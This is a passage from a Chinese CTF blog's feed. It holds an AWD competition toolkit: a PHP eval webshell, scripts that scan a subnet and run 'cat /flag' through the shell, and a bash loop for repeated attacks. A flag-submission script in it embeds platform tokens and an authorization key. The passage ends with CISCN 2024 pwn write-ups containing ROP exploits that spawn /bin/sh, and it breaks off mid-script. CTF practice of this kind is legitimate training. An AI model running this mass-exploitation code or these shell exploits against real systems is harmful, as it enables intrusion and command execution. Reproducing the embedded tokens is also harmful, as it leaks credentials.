00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 017ef48c 00d640ea     0ad8e898 000408f4 0000c322 GOM32Q_vc120_ReleaseQC+0x50392f06 017ef4ac 771116eb     000408f4 0000c322 0ada2b98 GOM32Q_vc120_ReleaseQC+0x5040ea<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>追溯到最后一个函数如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl __noreturn <span class="token function">_invoke_watson</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>Expression<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FunctionName<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FileName<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">,</span><span class="token class-name">uintptr_t</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">IsProcessorFeaturePresent</span><span class="token punctuation">(</span><span class="token number">0x17u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">__fastfail</span><span class="token punctuation">(</span><span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_call_reportfault</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1073740777</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">__crtTerminateProcess</span><span class="token punctuation">(</span><span class="token number">0xC0000417</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awd一句话木马批量攻击脚本</title>
      <link href="/2024/06/09/awd-yi-ju-hua-mu-ma-pi-liang-gong-ji-jiao-ben/"/>
      <url>/2024/06/09/awd-yi-ju-hua-mu-ma-pi-liang-gong-ji-jiao-ben/</url>
      
        <content type="html"><![CDATA[<p><code>awd</code>的批量攻击一直都在看<code>pwn</code>，<code>web</code>准备过几个脚本但还没实践过，这次上海市赛决赛现场调了一下批量攻击一句话木马的脚本，也是在现场废了不少时间…拿<code>pwn</code>的脚本改的，感觉<code>web</code>手的脚本会比我的简洁欸，凑合看</p><h2 id="扫描ip"><a href="#扫描ip" class="headerlink" title="扫描ip"></a>扫描ip</h2><p>一句话木马在文件在<code>/assets/scripts/pass.php</code>，内容如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在获取<code>hosts</code>的时候需要将<code>url</code>中的格式修改成木马文件的路径，<code>init_hosts.py</code>脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingli <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_ip</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'http://10.103.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.1/assets/scripts/pass.php'</span></span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            li<span class="token punctuation">(</span><span class="token string">'[+] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hosts'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://10.103.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.1/assets/scripts/pass.php\n'</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Not 200 OK"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        ll<span class="token punctuation">(</span><span class="token string">'[-] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://10.103.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.1/assets/scripts/pass.php\n'</span></span><span class="token punctuation">)</span>NUM_THREADS <span class="token operator">=</span> <span class="token number">256</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>check_ip<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span> <span class="token operator">>=</span> NUM_THREADS<span class="token punctuation">:</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>    t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h2><p>需要修改<code>data</code>中的连接密码，例如本题是<code>pass</code>，<code>exp.py</code>代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">write_to_flags</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flags'</span><span class="token punctuation">,</span> <span class="token string">'ab'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>d <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"pass"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    write_to_flags<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Flag 已写入到 flags 文件中。"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取 flag 失败："</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="批量提交flag脚本"><a href="#批量提交flag脚本" class="headerlink" title="批量提交flag脚本"></a>批量提交flag脚本</h2><p><code>url</code>格式也搞了好一会…得重学<code>python</code>了唉。<code>submit_flag.py</code>脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token keyword">import</span> requestsflag_file <span class="token operator">=</span> <span class="token string">'./flags'</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># url = 'https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag=' + flag[:-1]</span>        <span class="token comment">#url = f"curl -X POST http://27.25.152.77:19999/api/flag -H 'Authorization: 7f120ca9b0e3024d06734a04a986cc55' -d '&#123;&#123; \"flag\": \"&#123;flag[:-1]&#125;\"&#125;&#125;'"</span>        url <span class="token operator">=</span> <span class="token string">"curl -k -H \"Content-Type:application/json\" -X POST -d '&#123;\"token\": \"0c9651851218f216253a2b0d84d24cfd\", \"flag\":\""</span>        url <span class="token operator">+=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        url <span class="token operator">+=</span> <span class="token string">"\", \"pk\":\"be7e7b26c6a5235bcedc8531d6bfd648\"&#125;\' \'https://10.10.26.231/api/awd/batch_flag/\'"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># r = requests.get(url)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[+] pwned!\x1b[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>flag_file<span class="token punctuation">)</span> <span class="token keyword">as</span> flag_txt<span class="token punctuation">:</span>        flags <span class="token operator">=</span> flag_txt<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> flag <span class="token keyword">in</span> flags<span class="token punctuation">:</span>            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>submit<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="批量攻击脚本"><a href="#批量攻击脚本" class="headerlink" title="批量攻击脚本"></a>批量攻击脚本</h2><p>批量攻击脚本<code>attack.sh</code>如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token assign-left variable">attack_times</span><span class="token operator">=</span><span class="token number">10000</span><span class="token assign-left variable">round_wait_time</span><span class="token operator">=</span><span class="token number">30</span> <span class="token comment"># 20 min</span><span class="token assign-left variable">wait_submit_time</span><span class="token operator">=</span><span class="token number">5</span> <span class="token comment"># 20 s</span><span class="token assign-left variable">log_file</span><span class="token operator">=</span><span class="token string">"logs"</span><span class="token assign-left variable">run_time</span><span class="token operator">=</span><span class="token number">120</span> <span class="token comment">#timeout</span><span class="token assign-left variable">next_attack_time</span><span class="token operator">=</span><span class="token number">2.5</span> <span class="token comment">#half time</span><span class="token assign-left variable">max_concurrent_attacks</span><span class="token operator">=</span><span class="token number">10</span> <span class="token comment"># Max number of concurrent attacks</span><span class="token function-name function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token string">"+%H:%M:%S"</span><span class="token variable">)</span></span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"[<span class="token variable">$t</span>]<span class="token variable">$1</span>"</span> <span class="token comment"># Fixed missing parameter usage</span>    <span class="token assign-left variable">info</span><span class="token operator">=</span><span class="token string">"<span class="token entity" title="\033">\033</span>[43;37m <span class="token variable">$m</span> <span class="token entity" title="\033">\033</span>[0m"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$info</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$m</span>"</span> <span class="token operator">>></span> <span class="token variable">$log_file</span><span class="token punctuation">&#125;</span><span class="token function-name function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin class-name">echo</span> <span class="token string">"-- round <span class="token variable">$1</span> -- "</span> <span class="token operator">>></span> all_flags    <span class="token function">cat</span> flags <span class="token operator">>></span> all_flags    <span class="token function">rm</span> flags    <span class="token builtin class-name">local</span> <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> hosts<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token function">timeout</span> <span class="token parameter variable">--foreground</span> <span class="token variable">$run_time</span> python3 ./exp.py <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">&amp;</span>        <span class="token function">sleep</span> <span class="token variable">$next_attack_time</span>        <span class="token variable"><span class="token punctuation">((</span>jobs<span class="token operator">++</span><span class="token punctuation">))</span></span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$jobs</span>"</span> <span class="token parameter variable">-ge</span> <span class="token string">"<span class="token variable">$max_concurrent_attacks</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token function">wait</span> <span class="token comment"># Wait for all background jobs to finish</span>            <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">fi</span>    <span class="token keyword">done</span>    <span class="token function">wait</span> <span class="token comment"># Ensure all attacks are complete before moving on</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting <span class="token variable">$wait_submit_time</span> s to submit flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$wait_submit_time</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Submitting flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    python3 ./submit_flag.py<span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> attack_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"-------- round <span class="token variable">$i</span> --------"</span>    log <span class="token string">"<span class="token variable">$m</span>"</span>    attack <span class="token variable">$i</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting next round<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$round_wait_time</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024CISCN初赛PWN</title>
      <link href="/2024/05/19/2024ciscn-chu-sai/"/>
      <url>/2024/05/19/2024ciscn-chu-sai/</url>
      
        <content type="html"><![CDATA[<p>题目：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/CISCN%E5%88%9D%E8%B5%9B/PWN">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/CISCN%E5%88%9D%E8%B5%9B/PWN</a></p><h3 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h3><p>其实<code>func2</code>就是后门，输入很长的内容会提示<code>unexpected return</code>，根据返回地址判断填充长度为<code>0x1d0</code>，但是填充内容只能是<code>\x00</code>，所以本题可以填充后直接返回到<code>func2</code>，比赛的时候想到的是<code>rop</code>链，但是直接写入很长的<code>rop</code>链内容会被改变，所以需要一次读到<code>bss</code>段再迁移到<code>bss</code>段</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.133.9'</span><span class="token punctuation">,</span> <span class="token number">15152</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>syscall <span class="token operator">=</span> <span class="token number">0x0000000000404043</span>pop_rdi_r14_r13_r12_rbp_rbx_ret <span class="token operator">=</span> <span class="token number">0x00000000004a18a5</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x000000000042138a</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000004944ec</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x000000000040f984</span>leave_ret <span class="token operator">=</span> <span class="token number">0x00000000004A0BCF</span>bss <span class="token operator">=</span> <span class="token number">0x579600</span>pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x4023ed</span>p1 <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x1d0</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_r14_r13_r12_rbp_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'message'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_r14_r13_r12_rbp_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h3><p>堆溢出改掉<code>top chunk size</code>，申请的堆块大小大于<code>top chunk</code>，<code>top chunk</code>就会被链入<code>unsorted bin</code>并且重新映射新的<code>top chunk</code>，继续申请小的堆块就能切割被链入<code>unsorted bin</code>的前<code>top chunk</code>得到<code>libc</code>地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token 